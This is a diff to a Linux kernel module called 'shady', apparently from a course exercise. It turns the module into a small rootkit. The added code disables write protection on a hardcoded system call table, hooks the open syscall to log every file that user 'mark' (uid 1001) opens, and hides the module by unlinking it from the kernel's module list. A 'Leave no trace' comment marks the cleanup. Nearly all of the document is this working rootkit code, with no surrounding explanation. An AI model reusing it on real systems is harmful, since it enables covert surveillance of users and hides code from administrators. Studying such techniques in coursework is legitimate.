@@ -29,6 +29,7 @@
 #include <linux/device.h>
 #include <linux/mutex.h>
 #include <linux/unistd.h>
+#include <linux/cred.h>
 
 #include <asm/uaccess.h>
 
@@ -41,6 +42,8 @@ MODULE_LICENSE("GPL");
 
 /* parameters */
 static int shady_ndevices = SHADY_NDEVICES;
+static unsigned long * system_call_table_address = 0xffffffff81801400;
+static unsigned int marks_uid = 1001;
 
 module_param(shady_ndevices, int, S_IRUGO);
 /* ================================================================ */
@@ -48,31 +51,22 @@ module_param(shady_ndevices, int, S_IRUGO);
 static unsigned int shady_major = 0;
 static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
-//81809cc0
-//81801400;
-//ffffffff81801400
-
-void **system_call_table_address = (void*)0xffffffff81801400;
-int markID = 1001; //from the user file
 /* ================================================================ */
-void set_addr_rw (unsigned long addr) {
-  unsigned int level;
-  pte_t *pte = lookup_address(addr, &level);
-  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
-}
 
-asmlinkage int (*old_open) (const char*, int, int);
+/* Adding the code Regehr told me to */
+asmlinkage int (*old_open) (const char*, int, int); // Old function pointer
 
-asmlinkage int my_open (const char* file, int flags, int mode)
+asmlinkage int my_open (const char* file, int flags, int mode) // Replacement function
 {
-   /* YOUR CODE HERE */
-  printk(KERN_INFO "Zirak IS GOING TO OPEN %s file\n", file);
-  if (current_uid().val == markID) {
-    printk(KERN_INFO "MARK IS GOING TO OPEN %s file\n", file);
+  unsigned int userId = get_current_user()->uid.val;  
+
+  if(userId == marks_uid)
+  {
+    printk(KERN_INFO "mark is about to open \'%s\'\n", file);
   }
-  //reassgin the syscall to oldopen
   return old_open(file, flags, mode);
 }
+
 int 
 shady_open(struct inode *inode, struct file *filp)
 {
@@ -192,9 +186,6 @@ shady_construct_device(struct shady_dev *dev, int minor,
     cdev_del(&dev->cdev);
     return err;
   }
-
-  printk ("shady module loaded\n");
- 
   return 0;
 }
 
@@ -207,8 +198,6 @@ shady_destroy_device(struct shady_dev *dev, int minor,
   device_destroy(class, MKDEV(shady_major, minor));
   cdev_del(&dev->cdev);
   kfree(dev->data);
-  printk ("shady module unloaded\n");
-
   return;
 }
 
@@ -217,6 +206,9 @@ static void
 shady_cleanup_module(int devices_to_destroy)
 {
   int i;
+
+  // Leave no trace. Restore old system call function.
+  system_call_table_address[__NR_open] = old_open;
   
   /* Get rid of character devices (if any exist) */
   if (shady_devices) {
@@ -242,7 +234,19 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
+
+  // Turn off write protection on system call table
+  unsigned int level;
+  pte_t *pte = lookup_address(system_call_table_address, &level);
+  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
+
+  // Modify system call table
+  old_open = system_call_table_address[__NR_open];
+  system_call_table_address[__NR_open] = my_open;
   
+  // Hide module
+  list_del(&THIS_MODULE->list);
+
   if (shady_ndevices <= 0)
     {
       printk(KERN_WARNING "[target] Invalid value of shady_ndevices: %d\n", 
@@ -283,13 +287,6 @@ shady_init_module(void)
       goto fail;
     }
   }
-
- // printk(KERN_INFO "changging addresses");
-  set_addr_rw((unsigned long)system_call_table_address);
-  old_open = system_call_table_address[__NR_open];
-  system_call_table_address[__NR_open] = my_open;
-
-
   
   return 0; /* success */
 
@@ -302,9 +299,6 @@ static void __exit
 shady_exit_module(void)
 {
   shady_cleanup_module(shady_ndevices);
-  system_call_table_address[__NR_open] = old_open;
-  printk(KERN_INFO "Recovered address of the old open inside sys_cal_table.\n");
-
   return;
 }
 
